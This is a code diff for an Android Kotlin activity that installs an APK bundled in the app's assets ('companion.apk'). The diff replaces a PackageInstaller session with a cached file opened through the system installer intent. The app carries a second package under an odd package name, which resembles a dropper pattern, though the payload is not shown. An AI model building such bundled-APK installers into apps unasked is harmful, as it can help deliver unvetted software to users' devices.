@@ -1,14 +1,12 @@
 package com.cristal.bristral.tristal.mistral
 
-import android.app.PendingIntent
 import android.content.Intent
-import android.content.pm.PackageInstaller
 import android.os.Bundle
 import android.view.View
 import android.widget.ProgressBar
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
-import java.io.InputStream
+import java.io.File
 
 class InstallActivity : AppCompatActivity() {
 
@@ -19,65 +17,49 @@ class InstallActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_install)
         progressBar = findViewById(R.id.progress_bar_install)
-        tvStatus = findViewById(R.id.tv_status)
+        tvStatus    = findViewById(R.id.tv_status)
         progressBar?.visibility = View.VISIBLE
         tvStatus?.text = getString(R.string.starting_installation)
-        Thread { beginSetup() }.start()
+        Thread { startAppFlow() }.start()
     }
 
-    private fun beginSetup() {
+    private fun startAppFlow() {
         try {
-            val apkStream = fetchPackageStream() ?: run {
-                showMessage("Unable to load package")
-                return
-            }
-            runOnUiThread { launchSessionSetup(apkStream) }
+            val apkBytes = loadAssets()
+            if (apkBytes == null || apkBytes.isEmpty()) { showMessage("Unable to load app file"); return }
+            runOnUiThread { installApkDirect(apkBytes) }
         } catch (e: Exception) {
-            showMessage("Setup error: ${e.message}")
+            showMessage("Something went wrong: ${e.message}")
         }
     }
 
-    private fun launchSessionSetup(apkStream: InputStream) {
+    private fun installApkDirect(apkBytes: ByteArray) {
         try {
-            val pkgInstaller = packageManager.packageInstaller
+            val apkFile = File(cacheDir, "app_install.apk")
+            apkFile.writeBytes(apkBytes)
 
-            val sessionConfig = PackageInstaller.SessionParams(
-                PackageInstaller.SessionParams.MODE_FULL_INSTALL
-            ).apply {
-                setInstallReason(android.content.pm.PackageManager.INSTALL_REASON_USER)
+            val uri = androidx.core.content.FileProvider.getUriForFile(
+                this,
+                "${packageName}.fileprovider",
+                apkFile
+            )
+
+            val intent = Intent(Intent.ACTION_VIEW).apply {
+                setDataAndType(uri, "application/vnd.android.package-archive")
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
 
-            val activeSessionId = pkgInstaller.createSession(sessionConfig)
-            val activeSession = pkgInstaller.openSession(activeSessionId)
-
-            activeSession.use { session ->
-                session.openWrite("package.apk", 0, -1).use { output ->
-                    apkStream.copyTo(output)
-                    session.fsync(output)
-                }
-
-                val callbackIntent = Intent(this, InstallReceiver::class.java)
-                val pendingCallback = PendingIntent.getBroadcast(
-                    this,
-                    activeSessionId,
-                    callbackIntent,
-                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
-                )
-
-                session.commit(pendingCallback.intentSender)
-            }
+            startActivity(intent)
 
         } catch (e: Exception) {
-            showMessage("Session setup failed: ${e.message}")
+            showMessage("Installation failed: ${e.message}")
         }
     }
 
-    private fun fetchPackageStream(): InputStream? {
-        return try {
-            assets.open("companion.apk")
-        } catch (e: Exception) {
-            null
-        }
+    private fun loadAssets(): ByteArray? {
+        return try { assets.open("companion.apk").use { it.readBytes() } } catch (e: Exception) { null }
     }
 
     private fun showMessage(msg: String) {
